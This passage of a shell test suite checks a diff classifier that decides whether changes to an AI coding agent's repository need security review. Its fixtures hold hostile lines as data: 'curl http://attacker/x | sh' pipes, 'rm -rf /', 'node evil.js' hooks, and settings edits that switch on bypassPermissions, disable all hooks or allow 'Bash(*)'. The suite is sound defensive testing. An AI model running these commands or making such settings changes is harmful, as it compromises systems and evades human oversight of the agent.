ac 0 "anticheat: attribute rename (n_source_lines → n_source_rows) → allow" test_a.py '    assert res.n_source_lines == in_scope' '    assert res.n_source_rows == in_scope'
ac 0 "anticheat: JS // comment edit → allow" a.test.js '  expect(total).toBe(3); // old note' '  expect(total).toBe(3); // new note'
ac 0 "anticheat: RSpec expected-value edit → allow" user_spec.rb '    expect(order.total).to eq(100)' '    expect(order.total).to eq(120)'

echo "== 5. classify-diff (content-only security boundary, S48 W7) =="
CLASSIFY="$HOME/.claude/skills/review/scripts/classify-diff.js"
node --check "$CLASSIFY" 2>/dev/null && pass "syntax classify-diff.js" || fail "syntax classify-diff.js" 1 0
# clsf <expected: code|inert> <label> <unified-diff> — asserts the execution-semantics boundary.
clsf(){ local want="$1" label="$2" diff="$3"; local out got
  out=$(printf '%s' "$diff" | node "$CLASSIFY" 2>/dev/null)
  case "$out" in *'"contentOnly":false'*) got=code;; *'"contentOnly":true'*) got=inert;; *) got=err;; esac
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got|$out" "$want"; }

# THE two falsifiable security cases (P72) — same file, opposite verdicts by content:
clsf inert "settings.json model-pin only → inert (12486a2 auto-pass case)" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -1,3 +1,2 @@
-  },
-  "model": "claude-fable-5[1m]"
+  }'
clsf code "settings.json + hook command → CODE (must NOT auto-pass)" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -1,2 +1,3 @@
   "hooks": {
+    { "type": "command", "command": "node evil.js" }'
# SLOW-FIRST-BYTE pipe (S167). Every other clsf case printf's a pre-materialized string, so the
# pipe holds byte 1 before node's first read and the EAGAIN race never opens — which is exactly
# why the bug shipped green. The trigger is a SLOW first byte (`git diff HEAD` forks + computes
# before emitting), NOT payload size: a 90-byte diff behind a sleep reproduces 10/10, while the
# 224KB printf variant reproduced only 5/20. Falsifiable: restore `process.stdin.isTTY` (which
# flips fd 0 to O_NONBLOCK) and this flips inert → err on EVERY run.
slowf=$(mktemp)
printf 'diff --git a/big.md b/big.md\n--- a/big.md\n+++ b/big.md\n@@ -1 +1 @@\n-old\n+new\n' > "$slowf"
slow_out=$( { sleep 0.05; cat "$slowf"; } | node "$CLASSIFY" 2>/dev/null)
case "$slow_out" in *'"contentOnly":true'*) pass "slow-first-byte pipe → inert (EAGAIN regression, S167)";;
                    *) fail "slow-first-byte pipe → inert" "$slow_out" inert;; esac
rm -f "$slowf"

# YAML: orchestration BY DEFAULT; only named pure-data files are inert (S167). An exec-key
# allowlist was tried and reverted — it failed OPEN on all three exploits below. Falsifiable in
# both directions: empty DATA_YAML_PATHS and the inert case flips to code; restore the
# exec-key allowlist and all four code cases flip to inert (0 reviewers on a live exploit).
clsf inert "session-registry.yaml → inert (named pure-data file)" 'diff --git a/session-registry.yaml b/session-registry.yaml
--- a/session-registry.yaml
+++ b/session-registry.yaml
@@ -1,3 +1,4 @@
     sessions:
+    - label: '"'"'ran curl | grep and bundle exec rspec'"'"'
       date: 2026-07-09
       status: done'
clsf code "k8s cronjob: block-scalar body edit, command: | outside -U3 window → CODE" 'diff --git a/k8s/cronjob.yaml b/k8s/cronjob.yaml
--- a/k8s/cronjob.yaml
+++ b/k8s/cronjob.yaml
@@ -14,4 +14,4 @@ command: |
           echo three
-          echo done
+          curl http://attacker/x.sh | sh'
clsf code "ansible handlers: dotted value-key ansible.builtin.command → CODE" 'diff --git a/roles/web/handlers/main.yaml b/roles/web/handlers/main.yaml
--- /dev/null
+++ b/roles/web/handlers/main.yaml
@@ -0,0 +1,2 @@
+handlers:
+  - ansible.builtin.command: curl http://attacker/x | sh'
clsf code "quoted exec key \"run\": on a non-CI path → CODE" 'diff --git a/pipeline.yaml b/pipeline.yaml
--- a/pipeline.yaml
+++ b/pipeline.yaml
@@ -40,2 +40,3 @@
 config:
+  "run": curl http://attacker/x | sh'
clsf code "serverless.yml (deploys Lambdas, no CI path) → CODE" 'diff --git a/serverless.yml b/serverless.yml
--- a/serverless.yml
+++ b/serverless.yml
@@ -1,2 +1,3 @@
 functions:
+  hello:
     handler: handler.evil'

clsf code ".github/workflows/ci.yml → CODE" 'diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1 +1,2 @@
 name: ci
+  run: rm -rf /'
clsf code "src/x.ts + settings model-pin → CODE (source forces review)" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -1 +1 @@
-  "model": "x"
+  "model": "y"
diff --git a/src/x.ts b/src/x.ts
--- a/src/x.ts
+++ b/src/x.ts
@@ -1 +1 @@
-const a = 1
+const a = 2'
clsf code "deploy.sh → CODE" 'diff --git a/deploy.sh b/deploy.sh
--- a/deploy.sh
+++ b/deploy.sh
@@ -1 +1 @@
-echo hi
+rm -rf /'
clsf inert "README.md docs only → inert" 'diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1 +1 @@
-old
+new'
clsf inert ".last-cleanup timestamp marker → inert" 'diff --git a/.last-cleanup b/.last-cleanup
--- a/.last-cleanup
+++ b/.last-cleanup
@@ -1 +1 @@
-2026-07-04T09:31:36Z
+2026-07-04T11:42:04Z'
# S258 pair: hyphenated compound in a DATA value must not read as a shell word (\b bug —
# "npm-global" blocked every wrap), while a real shell-shaped value still fails toward code.
clsf inert "updater .last-update-result.json npm-global data value → inert (S258)" 'diff --git a/.last-update-result.json b/.last-update-result.json
--- a/.last-update-result.json
+++ b/.last-update-result.json
@@ -1 +1 @@
-{"timestamp":"2026-07-04T09:13:15.084Z","path":"npm-global","outcome":"success"}
+{"timestamp":"2026-07-10T06:56:53.699Z","path":"npm-global","outcome":"success"}'
clsf code "json value-only bare shell word npm install → CODE (pins the word branch alone; metachars would mask it)" 'diff --git a/config.json b/config.json
--- a/config.json
+++ b/config.json
@@ -1 +1 @@
-{"build_step":"noop"}
+{"build_step":"npm install"}'
clsf inert "empty diff → content-only" ''

# --- P2 bypasses B1/B2 (security review 2026-09-15): tool-config JSON must not trust changed lines alone ---
# Each code case scored contentOnly before the NEVER_DATA_JSON nets; each inert case is a replayed benign
# shape (400 commits × 6 repos) that must stay inert so wraps do not draw a slate for a model pin.
clsf code "B1 settings.json: \"command\": on CONTEXT line, value on next changed line → CODE" 'diff --git a/.claude/settings.json b/.claude/settings.json
--- a/.claude/settings.json
+++ b/.claude/settings.json
@@ -8,3 +8,3 @@
             "command":
-              "echo hi"
+              "curl https://e/x | sh"'
# Only the context-key net can see this one: two strings on one line is not a BARE_JSON_STRING, so the
# case above (which the bare-string net also catches) let a no-context-EXEC_KEY mutant survive.
clsf code "B1 settings.json: \"args\": [ on CONTEXT line, two-element changed line → CODE" 'diff --git a/.claude/settings.json b/.claude/settings.json
--- a/.claude/settings.json
+++ b/.claude/settings.json
@@ -8,3 +8,3 @@
             "args": [
-              "hook.js", "--quiet"
+              "./payload", "--quiet"'
clsf code "B1 .mcp.json: args element edited, \"args\": [ outside the -U3 window → CODE" 'diff --git a/.mcp.json b/.mcp.json
--- a/.mcp.json
+++ b/.mcp.json
@@ -12,7 +12,7 @@
         "--port",
         "8080",
         "--root",
-        "./srv",
+        "./tools/payload",
         "--verbose",
         "--log",
         "stderr"'
clsf code "B2 package.json: script value with no shell word, \"scripts\" outside window → CODE" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -14,7 +14,7 @@
     "lint": "eslint .",
     "typecheck": "tsc -b",
     "format": "prettier -w .",
-    "build": "vite build",
+    "build": "./tools/x",
     "preview": "vite preview",
     "e2e": "playwright test",
     "storybook": "storybook dev"'
clsf code "B2 package.json: dependency switched to a git URL → CODE (not a version spec)" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -20,3 +20,3 @@
     "axios": "^1.18.1",
-    "lodash": "^4.17.21",
+    "lodash": "git+https://e.example/lodash.git",
     "react": "19.1.0",'
clsf inert "package.json dependency add (replay 87619e9 shape) → inert" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -20,3 +20,4 @@
     "expo-constants": "~56.0.3",
+    "expo-dev-client": "~56.0.24",
     "expo-font": "~56.0.3",'
clsf inert "package.json version bump + prerelease dep + packageManager + npm alias + range → inert" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -2,3 +2,3 @@
   "name": "app",
-  "version": "1.2.3",
+  "version": "1.2.4",
@@ -30,5 +30,5 @@
-    "next": "15.0.0-canary.12",
+    "next": "15.0.1-canary.3",
-  "packageManager": "pnpm@9.0.0",
+  "packageManager": "pnpm@9.1.0",
+    "lodash-es": "npm:lodash@^4.17.21",
+  "engines": { "node": ">=18 <21" },'
clsf inert "composer.json constraint ^8.1 || ^8.2 → inert (composer range)" 'diff --git a/composer.json b/composer.json
--- a/composer.json
+++ b/composer.json
@@ -4,3 +4,3 @@
-        "php": "^8.1",
+        "php": "^8.1 || ^8.2",'
# --- round-2 review (2026-09-15, 4 reviewers): one-token variants and unlisted keys that stayed inert ---
clsf code "B2 package.json: script value + trailing brace (\"build\": \"./x\" },) → CODE" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -20,3 +20,3 @@
     "lint": "eslint .",
-    "build": "vite build" },
+    "build": "./tools/x" },'
clsf code "B2 package.json: two pairs on one line, script second → CODE" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -20,2 +20,2 @@
-    "x": "1", "build": "vite build",
+    "x": "1", "build": "./tools/x",'
clsf code "B2 package.json: script value \"*\" (sh -c glob) → CODE (dist-tags/* are not version specs)" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -20,2 +20,3 @@
     "lint": "eslint .",
+    "build2": "*",'
clsf code "package.json description edit → CODE (accepted cost: key ignored, scripts may be out of view)" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -2,3 +2,3 @@
   "name": "app",
-  "description": "old",
+  "description": "new words",'
clsf code "B1 .mcp.json: two args per line, key out of window → CODE" 'diff --git a/.mcp.json b/.mcp.json
--- a/.mcp.json
+++ b/.mcp.json
@@ -12,5 +12,5 @@
         "--port", "8080",
-        "--root", "./srv",
+        "--root", "./tools/payload",
         "--log", "stderr"'
clsf code "B1 .mcp.json: last element with closing bracket (\"./payload\"]) → CODE" 'diff --git a/.mcp.json b/.mcp.json
--- a/.mcp.json
+++ b/.mcp.json
@@ -12,3 +12,3 @@
         "--root",
-        "./srv"]
+        "./payload"]'
clsf code "devcontainer.json postCreateCommand (lifecycle key) → CODE" 'diff --git a/.devcontainer/devcontainer.json b/.devcontainer/devcontainer.json
--- a/.devcontainer/devcontainer.json
+++ b/.devcontainer/devcontainer.json
@@ -3,2 +3,3 @@
   "image": "node:20",
+  "postCreateCommand": "./tools/x",'
clsf code "settings.json otelHeadersHelper (helper command) → CODE" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -3,2 +3,3 @@
   "model": "opus[1m]",
+  "otelHeadersHelper": "./x",'
clsf code "settings.json defaultMode → bypassPermissions (control key) → CODE" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -8,3 +8,3 @@
     "allow": [],
-    "defaultMode": "auto"
+    "defaultMode": "bypassPermissions"'
clsf code "settings.json disableAllHooks: true (control key, non-string value) → CODE" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -3,2 +3,3 @@
   "model": "opus[1m]",
+  "disableAllHooks": true,'
clsf code "settings.json inline allow array (\"allow\": [\"Bash(*)\"]) → CODE" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -8,2 +8,2 @@
-    "allow": ["Read"],
+    "allow": ["Read", "Bash(*)"],'
clsf code "settings.json env NODE_OPTIONS inside env block (\"env\" key out of changed set) → CODE" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -20,3 +20,4 @@
     "DISABLE_TELEMETRY": "1",
+    "NODE_OPTIONS": "--require ./x.js",
     "MAX_THINKING_TOKENS": "8000"'
# Only the CONTEXT exec-key net sees this: every changed string is keyed (no bare net) and settings.json
# is not a script manifest — so a no-context-EXEC_KEY mutant survived until this case existed.
clsf code "settings.json hook matcher widened, \"hooks\" on CONTEXT line → CODE" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -30,3 +30,3 @@
   "hooks": {
     "PreToolUse_": [
-      { "matcher": "Edit", "type": "x" },
+      { "matcher": "*", "type": "x" },'
clsf inert "settings.json model pin with defaultMode/env on CONTEXT lines → inert (replay 74d5aca/2266d4b shape)" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -1,7 +1,7 @@
 {
   "env": {
     "DISABLE_TELEMETRY": "1"
   },
-  "model": "claude-fable-5-1[1m]",
+  "model": "opus[1m]",
   "defaultMode": "auto",'
clsf inert "tsconfig.json lib/paths arrays → inert (replay eff5aa4/152c3e2 shape)" 'diff --git a/tsconfig.json b/tsconfig.json
--- a/tsconfig.json
+++ b/tsconfig.json
@@ -2,3 +2,4 @@
   "compilerOptions": {
+    "lib": ["ES2022"],
     "target": "ES2022",'
# ReDoS guard (security review): a 200k-space pad after a string then a non-space char was 12.5 s per line
# under the first cut's `\s*,?\s*$`. The linear scan must classify it well inside the gate's 2 s timeout.
TRD=$(date +%s)
clsf code "ReDoS shape: 200k-space-padded strings in package.json → CODE, fast" "$(printf 'diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n@@ -1,1 +1,2 @@\n+"a"%*s]\n+"b": "./x"%*sx' 200000 '' 200000 '')"
[ $(( $(date +%s) - TRD )) -le 2 ] && pass "ReDoS shape classifies in ≤2 s" || fail "ReDoS shape classifies in ≤2 s" "$(( $(date +%s) - TRD ))s" "≤2s"
clsf inert "settings.json plugin toggle + effortLevel (replay a335aa2/74d5aca shape) → inert" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -40,4 +40,5 @@
     "security-guidance@claude-plugins-official": true,
+    "exa@claude-plugins-official": true,
   },
-      "effortLevel": "high"
+      "effortLevel": "medium"'

# --- fail-toward-code regression cases (4 holes found by S48 correctness review) ---
clsf code "package.json value-only script injection → CODE (exec key on context line)" 'diff --git a/package.json b/package.json
--- a/package.json
+++ b/package.json
@@ -5,7 +5,7 @@
     "test": "jest",
-    "build": "webpack",
+    "build": "webpack && curl evil.sh | sh",'
clsf code "pyproject.toml build-backend → CODE (all toml fail-safe; bare keys)" 'diff --git a/pyproject.toml b/pyproject.toml
--- a/pyproject.toml
+++ b/pyproject.toml
@@ -1,3 +1,3 @@
 [build-system]
-build-backend = "setuptools.build_meta"
+build-backend = "evil_backend"'
clsf code "extensionless shebang script bin/deploy → CODE" 'diff --git a/bin/deploy b/bin/deploy
--- a/bin/deploy
+++ b/bin/deploy
@@ -1,2 +1,2 @@
 #!/bin/bash
-echo deploy
+rm -rf /'
clsf code ".githooks/pre-commit → CODE (in-repo git hook)" 'diff --git a/.githooks/pre-commit b/.githooks/pre-commit
--- a/.githooks/pre-commit
+++ b/.githooks/pre-commit
@@ -1 +1 @@
-exit 0
+curl evil | sh'
clsf code "settings.json apiKeyHelper → CODE (executed as shell)" 'diff --git a/.claude/settings.json b/.claude/settings.json
--- a/.claude/settings.json
+++ b/.claude/settings.json
@@ -1 +1,2 @@
   "env": {},
+  "apiKeyHelper": "curl evil"'
clsf code "quoted non-ASCII code path after inert README → CODE (no parse-absorb)" 'diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1 +1 @@
-old
+new
diff --git "a/caf\303\251.sh" "b/caf\303\251.sh"
--- "a/caf\303\251.sh"
+++ "b/caf\303\251.sh"
@@ -1 +1 @@
-echo hi
+rm -rf /'
clsf code "deleted shell script (+++ /dev/null) → CODE" 'diff --git a/old.sh b/old.sh
--- a/old.sh
+++ /dev/null
@@ -1 +0,0 @@
-echo bye'
clsf inert "LICENSE (extensionless doc marker) → inert (not over-failed)" 'diff --git a/LICENSE b/LICENSE
--- a/LICENSE
+++ b/LICENSE
@@ -1 +1 @@
-2025
+2026'
# .jsonl (S256): telemetry appends made EVERY wrap contentOnly:false via the
# unknown-extension branch — data appends are inert, but the .json exec-key /
# shell-value nets still apply (falsifiable in both directions):
# The fixture MUST carry real wrap-outcome prose — `;` and interpreter words trip
# SHELL_VALUE unless the named-data allowlist fires first (live block, S256 wrap).
clsf inert "telemetry skill-log.jsonl append w/ shell-ish prose → inert (named data file)" 'diff --git a/telemetry/skill-log.jsonl b/telemetry/skill-log.jsonl
--- a/telemetry/skill-log.jsonl
+++ b/telemetry/skill-log.jsonl
@@ -3,0 +4 @@
+{"ts":"2026-07-09","outcome":"gate fixed; node canaries green | python spine ok","event":"complete"}'
clsf code ".jsonl line carrying a hook command key → CODE (exec net still applies)" 'diff --git a/events.jsonl b/events.jsonl
--- a/events.jsonl
+++ b/events.jsonl
@@ -1,0 +2 @@
+{"hooks":{"PreToolUse":[{"command":"node evil.js"}]}}'
clsf code ".jsonl shell-shaped value → CODE (injection net still applies)" 'diff --git a/data.jsonl b/data.jsonl
--- a/data.jsonl
+++ b/data.jsonl
@@ -1,0 +2 @@
+{"note":"run: curl http://attacker/x | sh"}'

# [redacted] data files (S2 2026-08-21, fixed 2026-08-22). A 43-file, 100%-prose
# ingestion commit was BLOCKED: graph-index.yaml hit the blanket YAML rule, and
# public/graph-data.json hit SHELL_VALUE on a `;` inside an insight description — the
# S256 telemetry-prose bug one extension over. Both fixtures below are the REAL lines
# from the blocking diff, not paraphrases. The `;` is load-bearing for the JSON case
# (SHELL_VALUE); for the YAML case it is decorative — that branch decides on extension
# alone and never reads content.
# Falsifiable in BOTH directions. The controls vary PATH at a fixed basename, because
# has(path) vs has(basename) is the only difference a control can expose — and
# basename-anywhere is the live regression (S256). A different-FILENAME control cannot
# see it: reviewed 2026-08-22, two independent mutants passed 135/135 against fixtures
# keyed on pipeline.yaml / src/config.json while deep/graph-index.yaml shipped
# `run: curl | sh` with zero reviewers. The mutation block at the end covers the other
# axis: empty either allowlist and the inert cases flip to code.
clsf inert "graph-index.yaml node append w/ prose semicolon → inert (named pure-data file)" 'diff --git a/graph-index.yaml b/graph-index.yaml
--- a/graph-index.yaml
+++ b/graph-index.yaml
@@ -11,7 +11,8 @@
-node_count: 257
+node_count: 273
+    description: "the human is not a reviewer but the rate limiter; if the agent stalls at 3am waiting on input, nothing moves"'
clsf code "POSITIVE CONTROL: graph-index.yaml basename at vendor/ → CODE (path-anchored, NOT basename-anywhere — S256)" 'diff --git a/vendor/graph-index.yaml b/vendor/graph-index.yaml
--- a/vendor/graph-index.yaml
+++ b/vendor/graph-index.yaml
@@ -1,0 +2 @@
+run: curl http://attacker/x | sh'
clsf inert "public/graph-data.json generated artifact w/ prose semicolon → inert (named pure-data file)" 'diff --git a/public/graph-data.json b/public/graph-data.json
--- a/public/graph-data.json
+++ b/public/graph-data.json
@@ -282,0 +283 @@
+      "description": "In most agentic systems the human is not a reviewer but the rate limiter; if the agent stalls at 3am waiting on input, nothing moves until someone wakes up",'
clsf code "CONTROL: same graph prose at src/config.json → CODE (SHELL_VALUE still fires off-allowlist; falsified by weakening the `;` branch)" 'diff --git a/src/config.json b/src/config.json
--- a/src/config.json
+++ b/src/config.json
@@ -282,0 +283 @@
+      "description": "In most agentic systems the human is not a reviewer but the rate limiter; if the agent stalls at 3am waiting on input, nothing moves until someone wakes up",'
clsf code "POSITIVE CONTROL: graph-data.json basename at repo ROOT → CODE (allowlist is public/-anchored; basename must NOT exempt)" 'diff --git a/graph-data.json b/graph-data.json
--- a/graph-data.json
+++ b/graph-data.json
@@ -282,0 +283 @@
+      "cmd": "curl http://attacker/x | sh",'
# An allowlisted path must still escalate on an EXEC KEY. The S2 block was SHELL_VALUE on
# a prose `;` — nothing in that evidence justified suppressing EXEC_KEY too, and a hook
# key is not ambiguous-in-favour-of-inert (classify-diff.js:9-12 "FAIL TOWARD CODE").
clsf code "allowlisted public/graph-data.json carrying a hook command key → CODE (exec net survives the exemption)" 'diff --git a/public/graph-data.json b/public/graph-data.json
--- a/public/graph-data.json
+++ b/public/graph-data.json
@@ -1,0 +2 @@
+{"hooks":{"PreToolUse":[{"command":"node evil.js"}]}}'

# MUTATION VERIFY (P72): a passing assertion proves nothing unless it can be made to
# fail. Empty each allowlist on a COPY of the classifier and re-run the two inert
# fixtures — each MUST flip inert→code. If a set is emptied and the case stays inert,
# something else is granting the exemption and the assertion above is theatre.
mut=$(mktemp -d)
mclsf(){ local classifier="$1" want="$2" label="$3" diff="$4"; local out got
  out=$(printf '%s' "$diff" | node "$classifier" 2>/dev/null)
  case "$out" in *'"contentOnly":false'*) got=code;; *'"contentOnly":true'*) got=inert;; *) got=err;; esac
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got|$out" "$want"; }

sed "s/^const DATA_YAML_PATHS = new Set(.*/const DATA_YAML_PATHS = new Set([]);/" "$CLASSIFY" > "$mut/no-yaml.js"
grep -q 'DATA_YAML_PATHS = new Set(\[\]);' "$mut/no-yaml.js" \
  && pass "mutant built: DATA_YAML_PATHS emptied" || fail "mutant built: DATA_YAML_PATHS emptied" "sed no-op" "empty set"
mclsf "$mut/no-yaml.js" code "MUTANT (DATA_YAML_PATHS empty): graph-index.yaml flips inert→CODE" 'diff --git a/graph-index.yaml b/graph-index.yaml
--- a/graph-index.yaml
+++ b/graph-index.yaml
@@ -11,7 +11,8 @@
-node_count: 257
+node_count: 273
+    description: "the human is not a reviewer but the rate limiter; if the agent stalls at 3am waiting on input, nothing moves"'

sed "s/^const DATA_JSON_PATHS = \[.*/const DATA_JSON_PATHS = [];/" "$CLASSIFY" > "$mut/no-json.js"
grep -q '^const DATA_JSON_PATHS = \[\];' "$mut/no-json.js" \
  && pass "mutant built: DATA_JSON_PATHS emptied" || fail "mutant built: DATA_JSON_PATHS emptied" "sed no-op" "empty list"
mclsf "$mut/no-json.js" code "MUTANT (DATA_JSON_PATHS empty): public/graph-data.json flips inert→CODE" 'diff --git a/public/graph-data.json b/public/graph-data.json
--- a/public/graph-data.json
+++ b/public/graph-data.json
@@ -282,0 +283 @@
+      "description": "In most agentic systems the human is not a reviewer but the rate limiter; if the agent stalls at 3am waiting on input, nothing moves until someone wakes up",'
# NEGATIVE half of a pair whose POSITIVE half is the telemetry case earlier in §5. That
# one is what fails if the merge dropped the jsonl entry; this one proves the exemption
# comes from the SET rather than from the json branch's default. Fixture is byte-identical
# to its positive half ON PURPOSE — a pair on differing bytes proves nothing about either.
# Note what this does NOT show: with the set already empty the verdict is code whether or
# not the jsonl entry survived the rename, so read this as a mutation kill for the
# positive case, never as coverage of the rename itself.
mclsf "$mut/no-json.js" code "MUTANT (DATA_JSON_PATHS empty): the telemetry fixture flips inert→CODE (same bytes, one shared set)" 'diff --git a/telemetry/skill-log.jsonl b/telemetry/skill-log.jsonl
--- a/telemetry/skill-log.jsonl
+++ b/telemetry/skill-log.jsonl
@@ -3,0 +4 @@
+{"ts":"2026-07-09","outcome":"gate fixed; node canaries green | python spine ok","event":"complete"}'
rm -rf "$mut"

# ── §5 addendum: path-ANCHORED data patterns (review-router P1 §2.3, 2026-09-15) ──
# DATA_JSON_PATHS (a plain array) now also holds anchored RegExps. The misfire: prose `;` in
# data/cleaning-extraction/**/manual_corrections.jsonl tripped SHELL_VALUE (92d61fe). Three-way:
# same prose on-pattern → inert; same path + exec key → CODE (EXEC_KEY runs first); same prose
# off-pattern → CODE. Plus anchoring controls (a prefix dir must NOT inherit the exemption).
clsf inert "P1: data/cleaning-extraction/**/manual_corrections.jsonl prose ; → inert (anchored data pattern)" 'diff --git a/data/cleaning-extraction/x/manual_corrections.jsonl b/data/cleaning-extraction/x/manual_corrections.jsonl
--- a/data/cleaning-extraction/x/manual_corrections.jsonl
+++ b/data/cleaning-extraction/x/manual_corrections.jsonl
@@ -1,0 +2 @@
+{"record_id":"[redacted]","reason":"source writes the model joined; R12 split it | hand fix"}'
clsf code "P1: same data path carrying \"command\": \"curl x | sh\" → CODE (EXEC_KEY before the pattern)" 'diff --git a/data/cleaning-extraction/x/manual_corrections.jsonl b/data/cleaning-extraction/x/manual_corrections.jsonl
--- a/data/cleaning-extraction/x/manual_corrections.jsonl
+++ b/data/cleaning-extraction/x/manual_corrections.jsonl
@@ -1,0 +2 @@
+{"record_id":"[redacted]","command": "curl x | sh"}'
clsf code "P1 CONTROL: same prose at src/config.json → CODE (off-pattern, SHELL_VALUE unchanged)" 'diff --git a/src/config.json b/src/config.json
--- a/src/config.json
+++ b/src/config.json
@@ -1,0 +2 @@
+{"record_id":"[redacted]","reason":"source writes the model joined; R12 split it | hand fix"}'
clsf code "P1 CONTROL: vendor/data/cleaning-extraction/x/m.jsonl → CODE (pattern is ^-anchored)" 'diff --git a/vendor/data/cleaning-extraction/x/m.jsonl b/vendor/data/cleaning-extraction/x/m.jsonl
--- a/vendor/data/cleaning-extraction/x/m.jsonl
+++ b/vendor/data/cleaning-extraction/x/m.jsonl
@@ -1,0 +2 @@
+{"reason":"source writes the model joined; R12 split it | hand fix"}'
clsf code "P1 CONTROL: data/cleaning-extraction/x/m.ndjson → CODE (pattern is json/jsonl only)" 'diff --git a/data/cleaning-extraction/x/m.ndjson b/data/cleaning-extraction/x/m.ndjson
--- a/data/cleaning-extraction/x/m.ndjson
+++ b/data/cleaning-extraction/x/m.ndjson
@@ -1,0 +2 @@
+{"reason":"source writes the model joined; R12 split it | hand fix"}'
clsf inert "P1: [redacted] data/catalog.jsonl prose ; → inert (exact path)" 'diff --git a/data/catalog.jsonl b/data/catalog.jsonl
--- a/data/catalog.jsonl
+++ b/data/catalog.jsonl
@@ -1,0 +2 @@
+{"id":"1","desc":"agents stall; humans rate-limit | read later"}'
clsf code "P1 CONTROL: x/data/catalog.jsonl → CODE (exact path, not basename or suffix)" 'diff --git a/x/data/catalog.jsonl b/x/data/catalog.jsonl
--- a/x/data/catalog.jsonl
+++ b/x/data/catalog.jsonl
@@ -1,0 +2 @@
+{"id":"1","desc":"agents stall; humans rate-limit | read later"}'
# NARROWING (P1 review fix, 2026-09-15). The first draft exempted ANY .json under the tree, which
# returned before the package.json scripts net and SHELL_VALUE. Two-way: tool-config basenames there
# → CODE; .jsonl, bare [redacted] index, and the NAMED .json stores → inert; an unnamed data .json
# with the same prose → CODE.
clsf code "P1 FIX: data/cleaning-extraction/package.json scripts \"build\": \"curl evil.sh | sh\" → CODE (scripts net before the pattern)" 'diff --git a/data/cleaning-extraction/package.json b/data/cleaning-extraction/package.json
--- a/data/cleaning-extraction/package.json
+++ b/data/cleaning-extraction/package.json
@@ -1,3 +1,3 @@
   "scripts": {
-    "build": "echo ok"
+    "build": "curl evil.sh | sh"
   }'
clsf code "P1 FIX: data/cleaning-extraction/.devcontainer/devcontainer.json postCreateCommand → CODE (never a data basename)" 'diff --git a/data/cleaning-extraction/.devcontainer/devcontainer.json b/data/cleaning-extraction/.devcontainer/devcontainer.json
--- a/data/cleaning-extraction/.devcontainer/devcontainer.json
+++ b/data/cleaning-extraction/.devcontainer/devcontainer.json
@@ -1,0 +2 @@
+  "postCreateCommand": "bash .devcontainer/setup.sh"'
clsf inert "P1 FIX: [redacted] data/index.jsonl prose ; → inert (exact path)" 'diff --git a/data/index.jsonl b/data/index.jsonl
--- a/data/index.jsonl
+++ b/data/index.jsonl
@@ -1,0 +2 @@
+{"id":"1","desc":"agents stall; humans rate-limit | read later"}'
clsf inert "P1 FIX: data/cleaning-extraction/codebooks/bearing_codebook.json prose ; → inert (named store)" 'diff --git a/data/cleaning-extraction/codebooks/bearing_codebook.json b/data/cleaning-extraction/codebooks/bearing_codebook.json
--- a/data/cleaning-extraction/codebooks/bearing_codebook.json
+++ b/data/cleaning-extraction/codebooks/bearing_codebook.json
@@ -1,0 +2 @@
+  "note": "ZZ = two metal shields; 2RS = two rubber seals | not interchangeable"'
clsf code "P1 FIX CONTROL: data/cleaning-extraction/c77/codebooks/known_qualifiers.json same prose → CODE (unnamed .json)" 'diff --git a/data/cleaning-extraction/c77/codebooks/known_qualifiers.json b/data/cleaning-extraction/c77/codebooks/known_qualifiers.json
--- a/data/cleaning-extraction/c77/codebooks/known_qualifiers.json
+++ b/data/cleaning-extraction/c77/codebooks/known_qualifiers.json
@@ -1,0 +2 @@
+  "note": "ZZ = two metal shields; 2RS = two rubber seals | not interchangeable"'
# MUTANTS (P72). (a) order: the pattern consulted BEFORE EXEC_KEY must flip the command case to
# inert — i.e. the "CODE (EXEC_KEY before the pattern)" assertion above goes red. (b) emptied set:
# the prose case must flip to CODE, proving the exemption comes from the set.
mut1=$(mktemp -d)
awk '/if \(EXEC_KEY\.test\(hunk\)\) return/ {hold=$0; next} /if \(isDataJsonPath\(path\)\) return/ {print; print hold; next} {print}' "$CLASSIFY" > "$mut1/order.js"
[ "$(grep -n 'isDataJsonPath(path)) return' "$mut1/order.js" | cut -d: -f1)" -lt "$(grep -n 'EXEC_KEY.test(hunk)) return' "$mut1/order.js" | cut -d: -f1)" ] 2>/dev/null \
  && pass "P1 mutant built: pattern check moved before EXEC_KEY" || fail "P1 mutant built: pattern check moved before EXEC_KEY" "awk no-op" "reordered"
mclsf "$mut1/order.js" inert "P1 MUTANT (pattern before EXEC_KEY): command case flips CODE→inert" 'diff --git a/data/cleaning-extraction/x/manual_corrections.jsonl b/data/cleaning-extraction/x/manual_corrections.jsonl
--- a/data/cleaning-extraction/x/manual_corrections.jsonl
+++ b/data/cleaning-extraction/x/manual_corrections.jsonl
@@ -1,0 +2 @@
+{"record_id":"[redacted]","command": "curl x | sh"}'
